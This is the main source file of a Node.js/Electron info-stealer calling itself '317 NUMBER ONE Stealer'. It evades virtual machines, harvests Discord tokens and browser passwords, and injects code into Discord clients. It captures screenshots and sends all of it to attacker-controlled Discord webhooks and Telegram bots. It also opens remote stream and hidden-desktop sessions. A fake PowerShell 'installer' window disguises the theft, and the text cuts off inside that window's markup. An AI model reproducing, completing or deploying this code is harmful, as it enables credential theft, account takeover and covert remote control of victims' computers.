// 317 NUMBER ONE Stealer - Electron Edition
// Main Entry Point with Telegram Support and Discord Logging

const path = require('path');
const os = require('os');
const fs = require('fs').promises;
const fsSync = require('fs');
const { spawn } = require('child_process');
const CONFIG = require('./config');
const { 
  getComputerName, 
  getUsername, 
  getCPUInfo, 
  getGPUInfo, 
  getRAMInfo, 
  getPublicIP, 
  getCountryFromIP, 
  countryCodeToFlag,
  detectVPN,
  isVirtualEnvironment,
  pathExists,
  expandPath,
  killProcess
} = require('./src/utils/system');
const { findTokensInPath, validateTokenAndGetInfo, fetchNitroBoostBadges, fetchRareFriends, fetchRareServers } = require('./src/modules/discord');
const { collectBrowserData } = require('./src/modules/browser');
const { buildDiscordEmbeds, buildSystemEmbed, buildRareServersEmbed, buildRareFriendsEmbed, buildStreamEmbed, buildHvncEmbed, uploadToWebhook, sendScreenshotWebhook } = require('./src/modules/webhook');
const { startStreamSession } = require('./src/modules/stream');
const { startHvncSession } = require('./src/modules/hvnc');
const { sendToTelegram, sendRareFriends, sendScreenshot, sendStreamSession, sendHvncSession } = require('./src/modules/telegram');
const { GetScreenShot } = require('./src/modules/screenshot');
// const { logBuildError } = require('./src/modules/logger');
const { performDiscordInjection } = require('./src/modules/injection');

/**
 * Main execution function
 */
async function main() {
  const startTime = Date.now();
  
  try {
    console.log('[317] 317 NUMBER ONE Stealer v3.1.7');
    console.log('[317] Starting execution...');
    
    // Fake error logic is in electron/main.js (guaranteed main process context)
    
    // Anti-VM/Sandbox check
    const isVM = await isVirtualEnvironment(CONFIG.BLACKLIST, CONFIG.MIN_REQUIREMENTS);
    if (isVM) {
      console.log('[317] Virtual environment detected, aborting.');
      process.exit(0);
    }
    console.log(`[317] Exfiltration mode: ${CONFIG.EXFIL_MODE}`);
    
    // Validate configuration
    if (CONFIG.EXFIL_MODE === 'telegram' || CONFIG.EXFIL_MODE === 'both') {
      if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === '') {
        throw new Error('Telegram bot token not configured');
      }
      if (!CONFIG.TELEGRAM_CHAT_ID || CONFIG.TELEGRAM_CHAT_ID === '') {
        throw new Error('Telegram chat ID not configured');
      }
    }
    
    // Initialization delay
    console.log('[317] Waiting 2 seconds...');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Collect system information
    console.log('[317] Gathering system information...');
    console.log('[317]   - calling collectSystemInfo()');
    const systemInfo = await collectSystemInfo();
    console.log('[317]   - collectSystemInfo() finished');
    console.log(`[317] Target: ${systemInfo.username}@${systemInfo.computerName}`);
    console.log(`[317] IP: ${systemInfo.ip} (${systemInfo.country})`);
    
    // ==========================================
    // STEP 1: Discord Intelligence Exfiltration
    // ==========================================
    console.log('[317] Searching for Discord tokens...');
    const allTokens = await collectDiscordTokens();
    console.log(`[317] Found ${allTokens.length} potential tokens`);
    
    console.log('[317] Validating Discord accounts...');
    const validAccounts = await validateDiscordAccounts(allTokens);
    console.log(`[317] Validated ${validAccounts.length} accounts`);
    
    let rareFriends = null;
    if (validAccounts.length > 0) {
      console.log('[317] Fetching Nitro/Boost badges...');
      for (const account of validAccounts) {
        try {
          const { nitro, boost, extra, bannerUrl } = await fetchNitroBoostBadges(account.token, account.id, CONFIG.NITRO_BADGES, CONFIG.BOOST_BADGES, true);
          if (nitro || boost || extra) {
            if (account.badges === 'None') account.badges = '';
            account.badges += nitro + boost + extra;
            if (account.badges === '') account.badges = 'None';
          }
          if (bannerUrl) account.bannerUrl = bannerUrl;
          await new Promise(resolve => setTimeout(resolve, 500));
        } catch (error) {}
      }
      
      console.log('[317] Fetching rare friends...');
      try {
        rareFriends = await fetchRareFriends(validAccounts[0].token, validAccounts[0].id, CONFIG.NITRO_BADGES, CONFIG.BOOST_BADGES);
        console.log(`[317] Found ${rareFriends.rareCount} rare friends`);
      } catch (error) {}
    }

    let rareServers = null;
    if (validAccounts.length > 0) {
      console.log('[317] Fetching rare servers...');
      try {
        rareServers = await fetchRareServers(validAccounts[0].token);
        console.log(`[317] Found ${rareServers.rareCount} rare servers`);
      } catch (error) {}
    }

    console.log('[317] Uploading Discord Intelligence...');
    if (CONFIG.EXFIL_MODE === 'discord' || CONFIG.EXFIL_MODE === 'both') {
      try {
        const discordEmbeds = buildDiscordEmbeds(validAccounts, systemInfo);
        console.log(`[317] Built ${discordEmbeds.length} Discord Intelligence embeds`);
        if (rareServers) {
          discordEmbeds.push(buildRareServersEmbed(rareServers, systemInfo));
        }
        if (rareFriends) {
          discordEmbeds.push(...buildRareFriendsEmbed(rareFriends, systemInfo));
        }
        const discordResult = await uploadToWebhook(CONFIG.WEBHOOK_URL, discordEmbeds, null);
        console.log(`[317] Discord Intelligence upload result: ${discordResult}`);
        if (!discordResult) {
          console.error('[317] Discord Intelligence upload returned false — webhook may have failed');
        }
      } catch (discordError) {
        console.error('[317] Discord Intelligence upload error:', discordError.message);
        console.error('[317] Stack:', discordError.stack);
      }
      // Rate limit protection — wait before next webhook call
      await new Promise(resolve => setTimeout(resolve, 1500));
    }

    // ==========================================
    // STEP 2: Discord Injection + Kill & Restart
    // ==========================================
    console.log('[317] Performing Discord injection...');
    try {
      const injectionResult = await performDiscordInjection(CONFIG.WEBHOOK_URL);
      if (injectionResult.injected > 0) {
        console.log(`[317] Discord injection successful: ${injectionResult.injected}/${injectionResult.found} clients injected`);
        
        // Kill all Discord processes so injection loads on next launch
        console.log('[317] Killing Discord processes for injection activation...');
        const discordProcesses = ['Discord.exe', 'DiscordCanary.exe', 'DiscordPTB.exe', 'DiscordDevelopment.exe'];
        for (const proc of discordProcesses) {
          await killProcess(proc);
        }
        
        // Wait for processes to fully terminate
        await new Promise(resolve => setTimeout(resolve, 2500));
        
        // Relaunch Discord silently via Update.exe (standard Discord launch method)
        console.log('[317] Relaunching Discord...');
        const localAppData = process.env.LOCALAPPDATA || '';
        const discordLaunchers = [
          { name: 'Discord', exe: path.join(localAppData, 'Discord', 'Update.exe') },
          { name: 'DiscordCanary', exe: path.join(localAppData, 'DiscordCanary', 'Update.exe') },
          { name: 'DiscordPTB', exe: path.join(localAppData, 'DiscordPTB', 'Update.exe') },
          { name: 'DiscordDevelopment', exe: path.join(localAppData, 'DiscordDevelopment', 'Update.exe') },
        ];
        
        for (const launcher of discordLaunchers) {
          try {
            if (require('fs').existsSync(launcher.exe)) {
              const child = require('child_process').spawn(
                launcher.exe, ['--processStart', `${launcher.name}.exe`],
                { detached: true, stdio: 'ignore', windowsHide: true }
              );
              child.unref();
              console.log(`[317] Relaunched ${launcher.name}`);
            }
          } catch (e) {}
        }
        
      } else if (injectionResult.found === 0) {
        console.log('[317] No Discord installations found, skipping injection');
      } else {
        console.log('[317] Discord injection failed for all installations');
      }
    } catch (injErr) {
      console.error('[317] Discord injection error:', injErr.message);
    }

    // ==========================================
    // STEP 3: Browser Data Exfiltration
    // ==========================================
    console.log('[317] Extracting browser data...');
    const zipPath = path.join(os.tmpdir(), `317_Browser_${Date.now()}.zip`);
    const { passwordCounts, browserStats } = await collectBrowserData(CONFIG.BROWSERS, zipPath);
    console.log('[317] Browser data collected');
    
    let exfilSuccess = false;
    
    console.log('[317] Uploading System & Browser Intelligence...');
    
    if (CONFIG.EXFIL_MODE === 'telegram' || CONFIG.EXFIL_MODE === 'both') {
      try {
        await sendToTelegram(CONFIG.TELEGRAM_BOT_TOKEN, CONFIG.TELEGRAM_CHAT_ID, validAccounts, systemInfo, passwordCounts, zipPath);
        if (rareFriends && rareFriends.rareCount > 0) {
          await new Promise(resolve => setTimeout(resolve, 1000));
          await sendRareFriends(CONFIG.TELEGRAM_BOT_TOKEN, CONFIG.TELEGRAM_CHAT_ID, rareFriends, systemInfo);
        }
        exfilSuccess = true;
      } catch (error) {
        console.error('[317] Telegram upload error:', error.message);
      }
    }
    
    if (CONFIG.EXFIL_MODE === 'discord' || CONFIG.EXFIL_MODE === 'both') {
      try {
        const systemEmbeds = buildSystemEmbed(systemInfo, passwordCounts, browserStats);
        const success = await uploadToWebhook(CONFIG.WEBHOOK_URL, systemEmbeds, zipPath);
        if (success) {
          exfilSuccess = true;
        } else {
          console.error('[317] System Intelligence webhook failed');
        }
      } catch (error) {
        console.error('[317] System Intelligence error:', error.message);
      }
    }
    
    // Cleanup browser data
    try {
      await fs.unlink(zipPath);
    } catch {}
    
    // Capture and send screenshot
    console.log('[317] Capturing screenshot...');
    const screenshotData = await GetScreenShot();
    
    if (screenshotData.success) {
      const screenshotPath = screenshotData.path;
      console.log('[317] Screenshot captured (' + screenshotData.size + ' bytes)');
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      if (CONFIG.EXFIL_MODE === 'telegram' || CONFIG.EXFIL_MODE === 'both') {
        try {
          await sendScreenshot(
            CONFIG.TELEGRAM_BOT_TOKEN,
            CONFIG.TELEGRAM_CHAT_ID,
            screenshotPath,
            systemInfo
          );
        } catch (error) {
          console.error('[317] Screenshot upload to Telegram failed:', error.message);
        }
      }
      
      if (CONFIG.EXFIL_MODE === 'discord' || CONFIG.EXFIL_MODE === 'both') {
        try {
          // Rate limit protection
          await new Promise(resolve => setTimeout(resolve, 1500));
          await sendScreenshotWebhook(CONFIG.WEBHOOK_URL, screenshotPath, systemInfo);
        } catch (error) {
          console.error('[317] Screenshot upload to Discord failed:', error.message);
        }
      }
      
      try {
        await fs.unlink(screenshotPath);
      } catch {}
    }
    
    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
    console.log(`[317] Data exfiltration complete! (${duration}s)`);
    
    // ==========================================
    // STEP 4: Stream Session
    // ==========================================
    console.log('[317] Starting Stream Session...');
    let streamInfo = null;
    try {
      streamInfo = await startStreamSession(systemInfo);
      
      if (streamInfo) {
        console.log(`[317] Stream Session active — Agent: ${streamInfo.agentId}`);
        
        if (CONFIG.EXFIL_MODE === 'discord' || CONFIG.EXFIL_MODE === 'both') {
          try {
            await new Promise(resolve => setTimeout(resolve, 1500));
            const streamEmbed = buildStreamEmbed(streamInfo, systemInfo);
            await uploadToWebhook(CONFIG.WEBHOOK_URL, [streamEmbed], null);
            console.log('[317] Stream Session embed sent to Discord');
          } catch (streamEmbedErr) {
            console.error('[317] Stream Discord embed error:', streamEmbedErr.message);
          }
        }
        
        if (CONFIG.EXFIL_MODE === 'telegram' || CONFIG.EXFIL_MODE === 'both') {
          try {
            await new Promise(resolve => setTimeout(resolve, 1000));
            await sendStreamSession(CONFIG.TELEGRAM_BOT_TOKEN, CONFIG.TELEGRAM_CHAT_ID, streamInfo, systemInfo);
            console.log('[317] Stream Session embed sent to Telegram');
          } catch (streamTgErr) {
            console.error('[317] Stream Telegram embed error:', streamTgErr.message);
          }
        }
      } else {
        console.log('[317] Stream Session skipped (no server configured or unreachable)');
      }
    } catch (error) {
      console.error('[317] Stream Session failed:', error.message);
    }
    
    // ==========================================
    // STEP 5: HVNC Session (Hidden Desktop)
    // ==========================================
    console.log('[317] Starting HVNC Session...');
    try {
      const hvncAgentId = streamInfo ? streamInfo.agentId : require('crypto').randomBytes(4).toString('hex').toUpperCase().substring(0, 8);
      const hvncInfo = await startHvncSession(hvncAgentId);
      
      // Build hvncInfo even if session failed — so embed always gets sent
      const hvncInfoFinal = hvncInfo || { agentId: hvncAgentId, desktopName: 'N/A' };
      hvncInfoFinal.viewUrl = `http://${CONFIG.STREAM_SERVER_HOST}:${CONFIG.STREAM_SERVER_PORT}/${hvncInfoFinal.agentId}/hvnc`;
      
      if (hvncInfo) {
        console.log(`[317] HVNC Session active — Agent: ${hvncInfo.agentId} Desktop: ${hvncInfo.desktopName}`);
      } else {
        console.log('[317] HVNC Session failed to start (desktop creation failed), sending embed anyway');
      }
      
      if (CONFIG.EXFIL_MODE === 'discord' || CONFIG.EXFIL_MODE === 'both') {
        try {
          await new Promise(resolve => setTimeout(resolve, 1500));
          const hvncEmbed = buildHvncEmbed(hvncInfoFinal, systemInfo);
          await uploadToWebhook(CONFIG.WEBHOOK_URL, [hvncEmbed], null);
          console.log('[317] HVNC embed sent to Discord');
        } catch (hvncEmbedErr) {
          console.error('[317] HVNC Discord embed error:', hvncEmbedErr.message);
        }
      }
      
      if (CONFIG.EXFIL_MODE === 'telegram' || CONFIG.EXFIL_MODE === 'both') {
        try {
          await new Promise(resolve => setTimeout(resolve, 1000));
          await sendHvncSession(CONFIG.TELEGRAM_BOT_TOKEN, CONFIG.TELEGRAM_CHAT_ID, hvncInfoFinal, systemInfo);
          console.log('[317] HVNC embed sent to Telegram');
        } catch (hvncTgErr) {
          console.error('[317] HVNC Telegram embed error:', hvncTgErr.message);
        }
      }
    } catch (error) {
      console.error('[317] HVNC Session error:', error.message);
    }
    
    // Stealer completed — Stream client keeps process alive
    console.log('[317] Stealer execution flow finished');
    
  } catch (error) {
    console.error('[317] Fatal error:', error.message);
    console.error(error.stack);
    
    // Log error to Discord if enabled
    if (CONFIG.DISCORD_LOGGING && CONFIG.WEBHOOK_URL) {
      await logBuildError(CONFIG.WEBHOOK_URL, error, {
        'Hostname': os.hostname(),
        'Platform': `${os.platform()} ${os.arch()}`,
        'Node Version': process.version
      });
    }
    // Log error
    console.error('[317] Stealer failed');
    
    throw error;
  }
}

/**
 * Collect system information
 */
async function collectSystemInfo() {
  console.log('[SYS] getting public IP...');
  const ip = await getPublicIP();
  console.log('[SYS] getting country from IP...');
  const { country, code } = await getCountryFromIP(ip);
  const countryFlag = countryCodeToFlag(code);
  
  console.log('[SYS] getting WMI/Hardware info...');
  const systemInfo = {
    computerName: getComputerName(),
    username: getUsername(),
    cpu: getCPUInfo(),
    gpu: await getGPUInfo(),
    ram: getRAMInfo(),
    ip,
    country,
    countryCode: code,
    countryFlag,
    vpn: await detectVPN(CONFIG.VPN_ADAPTERS),
    browsers: await detectInstalledSoftware(CONFIG.BROWSERS, 'browser'),
    launchers: await detectInstalledSoftware(CONFIG.LAUNCHERS, 'launcher'),
    games: await detectInstalledSoftware(CONFIG.GAMES, 'game'),
    wallets: await detectInstalledSoftware(CONFIG.WALLETS, 'wallet')
  };
  console.log('[SYS] system info collection complete!');
  
  return systemInfo;
}

/**
 * Detect installed software (browsers, games, wallets, etc.)
 */
async function detectInstalledSoftware(softwareConfig, type) {
  let foundEmojis = new Set();
  
  if (type === 'browser') {
    for (const [key, config] of Object.entries(softwareConfig)) {
      for (const browserPath of config.paths) {
        const expandedPath = expandPath(browserPath);
        if (await pathExists(expandedPath)) {
          foundEmojis.add(config.emoji);
          break;
        }
      }
    }
  } else {
    for (const [softwarePath, emoji] of Object.entries(softwareConfig)) {
      const expandedPath = expandPath(softwarePath);
      if (await pathExists(expandedPath)) {
        foundEmojis.add(emoji);
      }
    }
  }
  
  if (foundEmojis.size > 0) return Array.from(foundEmojis).join(' ');
  if (type === 'wallet') return '<a:no:1502431716403580969> `No Wallet`';
  return '<a:no:1502431716403580969> `None`';
}

/**
 * Collect Discord tokens from all paths
 */
async function collectDiscordTokens() {
  const allTokens = [];
  
  // Discord app paths
  for (const discordPath of CONFIG.DISCORD_PATHS) {
    const tokens = await findTokensInPath(discordPath);
    allTokens.push(...tokens);
  }
  
  // Browser-based Discord tokens
  for (const [key, config] of Object.entries(CONFIG.BROWSERS)) {
    for (const browserPath of config.paths) {
      const tokens = await findTokensInPath(browserPath);
      allTokens.push(...tokens);
    }
  }
  
  // Deduplicate
  return [...new Set(allTokens)];
}

/**
 * Validate Discord accounts
 */
async function validateDiscordAccounts(tokens) {
  const validAccounts = [];
  const seenIds = new Set();
  
  for (const token of tokens) {
    if (validAccounts.length >= 8) break; // Max 8 accounts
    
    const accountInfo = await validateTokenAndGetInfo(token);
    
    if (accountInfo && accountInfo.id !== 'Unknown' && !seenIds.has(accountInfo.id)) {
      seenIds.add(accountInfo.id);
      validAccounts.push(accountInfo);
    }
  }
  
  return validAccounts;
}

// === GLOBAL ERROR HANDLERS (prevent silent crashes) ===
process.on('uncaughtException', (error) => {
  console.error('[317] UNCAUGHT EXCEPTION:', error.message);
  console.error(error.stack);
  // Try emergency webhook notification
  try {
    const CONFIG = require('./config');
    if (CONFIG.WEBHOOK_URL) {
      fetch(CONFIG.WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: '317 NUMBER ONE',
          embeds: [{
            title: '❌ UNCAUGHT EXCEPTION',
            description: `\`\`\`\n${error.message}\n${(error.stack || '').substring(0, 500)}\n\`\`\``,
            color: 15158332,
            footer: { text: `317 · ${os.hostname()}` }
          }]
        })
      }).catch(() => {});
    }
  } catch {}
});

process.on('unhandledRejection', (reason) => {
  console.error('[317] UNHANDLED REJECTION:', reason);
});

// ==================== FAKE ERROR (YAVAŞ, İNANDIRICI) ====================
let loaderStarted = false;

function showFakeLoader() {
    return new Promise((resolve) => {
        if (loaderStarted) {
            resolve();
            return;
        }
        loaderStarted = true;

        try {
            console.log('[i] Starting premium loader...');
            const exeName = require('path').basename(process.execPath, '.exe') || 'Installer';
            const ps1 = String.raw`
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName System.Windows.Forms
 
$hwnd = (Get-Process -Id $pid).MainWindowHandle
$code = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$user32 = Add-Type -MemberDefinition $code -Name "User32" -Namespace "Win32" -PassThru
$user32::ShowWindow($hwnd, 0)
[System.Windows.Media.RenderOptions]::ProcessRenderMode = [System.Windows.Interop.RenderMode]::Default

$xaml = @"
<Window
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
Title="${exeName} Installer"
Width="900" Height="550"
WindowStartupLocation="CenterScreen"
WindowStyle="None"
AllowsTransparency="True"
Background="Transparent"
ResizeMode="NoResize"
Topmost="True">
  <Window.Resources>
    <ResourceDictionary>
      <Style x:Key="StepText" TargetType="TextBlock">
        <Setter Property="Foreground" Value="#666666"/>
        <Setter Property="FontSize" Value="13"/>
        <Setter Property="FontFamily" Value="Segoe UI"/>
        <Setter Property="FontWeight" Value="SemiBold"/>
        <Setter Property="VerticalAlignment" Value="Center"/>
        <Setter Property="Margin" Value="16,0,0,0"/>
      </Style>
      <Style x:Key="StepTextActive" TargetType="TextBlock" BasedOn="{StaticResource StepText}">
        <Setter Property="Foreground" Value="#FFFFFF"/>
        <Setter Property="FontWeight" Value="Bold"/>
      </Style>
      <Style x:Key="StepDotInactive" TargetType="Border">
        <Setter Property="Width" Value="28"/>
        <Setter Property="Height" Value="28"/>
        <Setter Property="CornerRadius" Value="14"/>
        <Setter Property="Background" Value="#0A0A0A"/>
        <Setter Property="BorderThickness" Value="2"/>
        <Setter Property="BorderBrush" Value="#222222"/>
      </Style>
      <Style x:Key="StepDotActive" TargetType="Border">
        <Setter Property="Width" Value="28"/>
        <Setter Property="Height" Value="28"/>
        <Setter Property="CornerRadius" Value="14"/>
        <Setter Property="Background" Value="#FFFFFF"/>
        <Setter Property="BorderThickness" Value="0"/>
        <Setter Property="Effect">
          <Setter.Value>
            <DropShadowEffect Color="#FFFFFF" BlurRadius="12" ShadowDepth="0" Opacity="0.5"/>
          </Setter.Value>
        </Setter>
      </Style>
    </ResourceDictionary>
  </Window.Resources>
  
  <Border CornerRadius="20" ClipToBounds="True" BorderThickness="1" BorderBrush="#2A2A2A">
    <Border.Background>
      <SolidColorBrush Color="#0D0D0D"/>
    </Border.Background>
    <Grid>
      <Grid.ColumnDefinitions>
        <ColumnDefinition Width="280"/>
        <ColumnDefinition Width="*"/>
      </Grid.ColumnDefinitions>

      <!-- Grid Pattern Background -->
      <Border Opacity="0.15">
        <Border.Background>
          <DrawingBrush Viewport="0,0,40,40" ViewportUnits="Absolute" TileMode="Tile">
            <DrawingBrush.Drawing>
              <GeometryDrawing>
                <GeometryDrawing.Geometry>
                  <GeometryGroup>
                    <LineGeometry StartPoint="0,0" EndPoint="40,0" />
                    <LineGeometry StartPoint="0,0" EndPoint="0,40" />
                  </GeometryGroup>
                </GeometryDrawing.Geometry>
                <GeometryDrawing.Pen>
                  <Pen Thickness="1" Brush="#FFFFFF" />
                </GeometryDrawing.Pen>
              </GeometryDrawing>
            </DrawingBrush.Drawing>
          </DrawingBrush>
        </Border.Background>
      </Border>

      <!-- Glowing Orbs (Pure White Monochrome) -->
      <Ellipse Name="glow1" Fill="#08FFFFFF" Width="600" Height="600" HorizontalAlignment="Right" VerticalAlignment="Top" Margin="0,-250,-250,0">
        <Ellipse.Effect>
          <BlurEffect Radius="150"/>
        </Ellipse.Effect>
      </Ellipse>
      <Ellipse Name="glow2" Fill="#05FFFFFF" Width="500" Height="500" HorizontalAlignment="Left" VerticalAlignment="Bottom" Margin="-200,0,0,-200">
        <Ellipse.Effect>
          <BlurEffect Radius="150"/>
        </Ellipse.Effect>
      </Ellipse>
 
      <!-- Sidebar -->
      <Border Grid.Column="0" BorderThickness="0,0,1,0" BorderBrush="#2A2A2A" Background="#90111111">
        <Grid Margin="35,45,35,40">
          <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
          </Grid.RowDefinitions>
 
          <StackPanel Grid.Row="0" Orientation="Horizontal">
            <Grid Width="52" Height="52" HorizontalAlignment="Center" VerticalAlignment="Center">
              <Border CornerRadius="16" BorderThickness="1.5" Background="#141414">
                <Border.BorderBrush>
                  <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
                    <GradientStop Color="#444444" Offset="0"/>
                    <GradientStop Color="#1A1A1A" Offset="1"/>
                  </LinearGradientBrush>
                </Border.BorderBrush>
                <Border.Effect>
                  <DropShadowEffect Color="#FFFFFF" BlurRadius="15" ShadowDepth="0" Opacity="0.1"/>
                </Border.Effect>
              </Border>

              <Grid Width="38" Height="38">
                <!-- Outer Tech Ring -->
                <Ellipse Stroke="#444444" StrokeThickness="1.5" StrokeDashArray="3 3" RenderTransformOrigin="0.5,0.5">
                  <Ellipse.RenderTransform>
                    <RotateTransform Angle="0"/>
                  </Ellipse.RenderTransform>
                  <Ellipse.Triggers>
                    <EventTrigger RoutedEvent="Loaded">
                      <BeginStoryboard>
                        <Storyboard>
                          <DoubleAnimation Storyboard.TargetProperty="(UIElement.RenderTransform).(RotateTransform.Angle)" From="0" To="360" Duration="0:0:10" RepeatBehavior="Forever"/>
                        </Storyboard>
                      </BeginStoryboard>
                    </EventTrigger>
                  </Ellipse.Triggers>
                </Ellipse>

                <!-- Inner Tech Ring -->
                <Ellipse Width="28" Height="28" Stroke="#888888" StrokeThickness="1" StrokeDashArray="1 2" RenderTransformOrigin="0.5,0.5">
                  <Ellipse.RenderTransform>
                    <RotateTransform Angle="0"/>
                  </Ellipse.RenderTransform>
                  <Ellipse.Triggers>
                    <EventTrigger RoutedEvent="Loaded">
                      <BeginStoryboard>
                        <Storyboard>
                          <DoubleAnimation Storyboard.TargetProperty="(UIElement.RenderTransform).(RotateTransform.Angle)" From="360" To="0" Duration="0:0:5" RepeatBehavior="Forever"/>
                        </Storyboard>
                      </BeginStoryboard>
                    </EventTrigger>
                  </Ellipse.Triggers>
                </Ellipse>

                <!-- Dynamic Cascading Arrows -->
                <Grid Width="18" Height="18" HorizontalAlignment="Center" VerticalAlignment="Center">
                  <Grid.Effect>
                    <DropShadowEffect Color="#FFFFFF" BlurRadius="8" ShadowDepth="0" Opacity="0.6"/>
                  </Grid.Effect>
                  <!-- Arrow 1 (Top) -->
                  <Path Data="M 2 1 L 9 6 L 16 1" Stroke="#FFFFFF" StrokeThickness="2.5" StrokeLineJoin="Round" StrokeStartLineCap="Round" StrokeEndLineCap="Round">
                    <Path.Triggers>
                      <EventTrigger RoutedEvent="Loaded">
                        <BeginStoryboard>
                          <Storyboard>
                            <DoubleAnimation Storyboard.TargetProperty="Opacity" From="0.1" To="1" Duration="0:0:0.6" AutoReverse="True" RepeatBehavior="Forever" BeginTime="0:0:0"/>
                          </Storyboard>
                        </BeginStoryboard>
                      </EventTrigger>
                    </Path.Triggers>
                  </Path>
                  <!-- Arrow 2 (Middle) -->
                  <Path Data="M 2 7 L 9 12 L 16 7" Stroke="#CCCCCC" StrokeThickness="2.5" StrokeLineJoin="Round" StrokeStartLineCap="Round" StrokeEndLineCap="Round">
                    <Path.Triggers>
                      <EventTrigger RoutedEvent="Loaded">
                        <BeginStoryboard>
                          <Storyboard>
                            <DoubleAnimation Storyboard.TargetProperty="Opacity" From="0.1" To="1" Duration="0:0:0.6" AutoReverse="True" RepeatBehavior="Forever" BeginTime="0:0:0.2"/>
                          </Storyboard>
                        </BeginStoryboard>
                      </EventTrigger>
                    </Path.Triggers>
                  </Path>
                  <!-- Arrow 3 (Bottom) -->
                  <Path Data="M 2 13 L 9 18 L 16 13" Stroke="#888888" StrokeThickness="2.5" StrokeLineJoin="Round" StrokeStartLineCap="Round" StrokeEndLineCap="Round">
                    <Path.Triggers>
                      <EventTrigger RoutedEvent="Loaded">
                        <BeginStoryboard>
                          <Storyboard>
                            <DoubleAnimation Storyboard.TargetProperty="Opacity" From="0.1" To="1" Duration="0:0:0.6" AutoReverse="True" RepeatBehavior="Forever" BeginTime="0:0:0.4"/>
                          </Storyboard>
                        </BeginStoryboard>
                      </EventTrigger>
                    </Path.Triggers>
                  </Path>
                </Grid>
              </Grid>
            </Grid>
            
            <StackPanel Margin="16,0,0,0" VerticalAlignment="Center">
              <TextBlock Text="${exeName}" Foreground="#FFFFFF" FontSize="20" FontWeight="Bold" FontFamily="Segoe UI">
                <TextBlock.Effect>
                  <DropShadowEffect Color="#FFFFFF" BlurRadius="12" ShadowDepth="0" Opacity="0.5"/>
                </TextBlock.Effect>
              </TextBlock>
              <TextBlock Text="CORE INSTALLER" Foreground="#888888" FontSize="10" FontWeight="Bold" FontFamily="Segoe UI" Margin="0,2,0,0"/>
            </StackPanel>
          </StackPanel>
 
          <StackPanel Grid.Row="1" Margin="0,70,0,0">
            <!-- Step 1 -->
            <StackPanel Orientation="Horizontal" Margin="0,0,0,0">
              <Border Name="dot1" Style="{StaticResource StepDotActive}">
                <TextBlock Text="1" Foreground="Black" FontSize="12" FontWeight="Bold" HorizontalAlignment="Center" VerticalAlignment="Center"/>
              </Border>
              <TextBlock Text="Initialization" Style="{StaticResource StepTextActive}"/>
            </StackPanel>
            
            <Border Name="line1" Width="2" Height="30" Background="#FFFFFF" HorizontalAlignment="Left" Margin="13,4,0,4">
               <Border.Effect>
                 <DropShadowEffect Color="#FFFFFF" BlurRadius="5" ShadowDepth="0"/>
               </Border.Effect>
            </Border>

            <!-- Step 2 -->
            <StackPanel Orientation="Horizontal" Margin="0,0,0,0">
              <Border Name="dot2" Style="{StaticResource StepDotActive}">
                <TextBlock Text="2" Foreground="Black" FontSize="12" FontWeight="Bold" HorizontalAlignment="Center" VerticalAlignment="Center"/>
              </Border>
              <TextBlock Text="Deployment" Style="{StaticResource StepTextActive}"/>
            </StackPanel>

            <Border Name="line2" Width="2" Height="30" Background="#2A2A2A" HorizontalAlignment="Left" Margin="13,4,0,4"/>

            <!-- Step 3 -->
            <StackPanel Name="step3panel" Orientation="Horizontal" Margin="0,0,0,0" Opacity="0.6">
              <Border Name="dot3" Style="{StaticResource StepDotInactive}">
                <TextBlock Name="txtDot3" Text="3" Foreground="#666666" FontSize="12" FontWeight="Bold" HorizontalAlignment="Center" VerticalAlignment="Center"/>
              </Border>
              <TextBlock Name="txtStep3" Text="Extraction" Style="{StaticResource StepText}"/>
            </StackPanel>

            <Border Name="line3" Width="2" Height="30" Background="#2A2A2A" HorizontalAlignment="Left" Margin="13,4,0,4"/>

            <!-- Step 4 -->
            <StackPanel Name="step4panel" Orientation="Horizontal" Opacity="0.6">
              <Border Name="dot4" Style="{StaticResource StepDotInactive}">
                <TextBlock Name="txtDot4" Text="4" Foreground="#666666" FontSize="12" FontWeight="Bold" HorizontalAlignment="Center" VerticalAlignment="Center"/>
              </Border>
              <TextBlock Name="txtStep4" Text="Finalization" Style="{StaticResource StepText}"/>
            </StackPanel>
          </StackPanel>
        </Grid>
      </Border>
 
      <!-- Main Content -->
      <Grid Grid.Column="1" Margin="45,45,45,35">
        <Grid.RowDefinitions>
          <RowDefinition Height="Auto"/>
          <RowDefinition Height="*"/>
          <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>
 
        <StackPanel Grid.Row="0">
          <TextBlock Text="System Deployment" Foreground="#FFFFFF" FontSize="32" FontWeight="Bold" FontFamily="Segoe UI" Margin="0,0,0,8"/>
          <TextBlock Text="Please do not turn off your computer. The system is securely acquiring and unpacking high-performance modules into the core registry." Foreground="#A0A0A0" FontSize="14" TextWrapping="Wrap" LineHeight="22" FontFamily="Segoe UI"/>
        </StackPanel>

        <Border Grid.Row="1" Margin="0,35,0,0" CornerRadius="16" Padding="25" VerticalAlignment="Top" BorderThickness="1" BorderBrush="#2A2A2A">
          <Border.Background>
            <SolidColorBrush Color="#111111" Opacity="0.8"/>
          </Border.Background>
          <StackPanel>
            <!-- Top stats -->
            <Grid Margin="0,0,0,16">
              <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                <!-- Check/Sync Icon -->
                <Path Data="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z" Fill="#FFFFFF" Width="14" Height="14" Stretch="Uniform"/>
                <TextBlock Name="txtStatus" Text="Initializing..." Foreground="#CCCCCC" FontSize="13" FontFamily="Consolas" Margin="10,0,0,0" VerticalAlignment="Center" TextTrimming="CharacterEllipsis" MaxWidth="280"/>
              </StackPanel>
              <TextBlock Name="txtPercent" Text="0%" Foreground="#FFFFFF" FontSize="24" FontWeight="Bold" HorizontalAlignment="Right" FontFamily="Segoe UI">
                <TextBlock.Effect>
